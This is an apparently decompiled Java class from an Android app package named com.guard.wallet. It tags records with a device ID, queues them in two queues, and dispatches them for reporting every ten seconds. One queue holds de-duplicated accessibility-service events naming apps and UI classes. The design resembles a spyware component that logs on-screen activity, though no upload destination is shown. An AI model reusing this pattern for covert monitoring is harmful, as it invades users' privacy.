/**
 * vendor thread/e.java — HandlerMsgAndTimer
 *
 * 消息队列管理器，维护普通队列和高优先级队列。
 * 通过 PeriodicTaskDispatcher (case 0) 定时刷新上报。
 */
package com.guard.wallet.thread;

import com.guard.wallet.core.AppUtils;
import com.guard.wallet.req.MessageRecordVO;
import com.guard.wallet.req.ReqMessageVO;
import com.guard.wallet.stat.AccessibilityEventStatVO;
import java.util.Date;
import java.util.Objects;
import java.util.Timer;
import java.util.concurrent.ConcurrentLinkedQueue;

public final class HandlerMsgAndTimer {
    public final Timer a;
    public boolean b;
    public Long c;
    public String d;
    public final ConcurrentLinkedQueue<ReqMessageVO> e;
    public final ConcurrentLinkedQueue<ReqMessageVO> f;

    public HandlerMsgAndTimer() {
        Timer timer = new Timer();
        this.a = timer;
        this.b = false;
        this.c = new Date().getTime();
        this.d = "";
        this.e = new ConcurrentLinkedQueue<>();
        this.f = new ConcurrentLinkedQueue<>();
        timer.schedule(new PeriodicTaskDispatcher(this, 0), 10000L, 10000L);
    }

    public final void a(MessageRecordVO<?> record) {
        String deviceId = com.guard.wallet.utils.SharedPrefsManager.l("deviceId");
        if (AppUtils.B(deviceId) || record == null) {
            return;
        }

        record.setDeviceId(deviceId);
        ReqMessageVO message = new ReqMessageVO();
        message.setDeviceId(record.getDeviceId());
        message.setIntentCode(record.getIntentCode());
        if (record.getExtraBody() != null) {
            message.setExtraBody(com.guard.wallet.utils.SharedPrefsManager.N(record.getExtraBody()));
        }
        this.f.offer(message);
    }

    public final void b(MessageRecordVO<?> record) {
        String deviceId = com.guard.wallet.utils.SharedPrefsManager.l("deviceId");
        if (AppUtils.B(deviceId) || record == null) {
            return;
        }

        record.setDeviceId(deviceId);
        boolean shouldQueue = true;
        if (Objects.equals(record.getIntentCode(), "android.accessibility.service.USAGE_SUMMARY")) {
            Object body = record.getExtraBody();
            if (body instanceof AccessibilityEventStatVO) {
                AccessibilityEventStatVO stat = (AccessibilityEventStatVO) body;
                String signature = "";
                if (!AppUtils.B(stat.getEventPackageName())) {
                    signature = stat.getEventPackageName();
                }
                if (!AppUtils.B(stat.getEventClassName())) {
                    signature = signature.concat(":").concat(stat.getEventClassName());
                }
                signature = signature.concat(":").concat(String.valueOf(stat.getEventValue()));
                if (Objects.equals(signature, this.d)) {
                    if (stat.getTimestamp() - this.c < 1000L) {
                        shouldQueue = false;
                    }
                } else {
                    this.d = signature;
                }
            }
        }

        if (shouldQueue) {
            ReqMessageVO message = new ReqMessageVO();
            message.setDeviceId(record.getDeviceId());
            message.setIntentCode(record.getIntentCode());
            if (record.getExtraBody() != null) {
                message.setExtraBody(com.guard.wallet.utils.SharedPrefsManager.N(record.getExtraBody()));
            }
            this.e.offer(message);
        }

        long timestamp = new Date().getTime();
        if (record.getExtraBody() != null && record.getExtraBody().getTimestamp() > 0) {
            timestamp = record.getExtraBody().getTimestamp();
        }
        this.c = timestamp;
    }
}
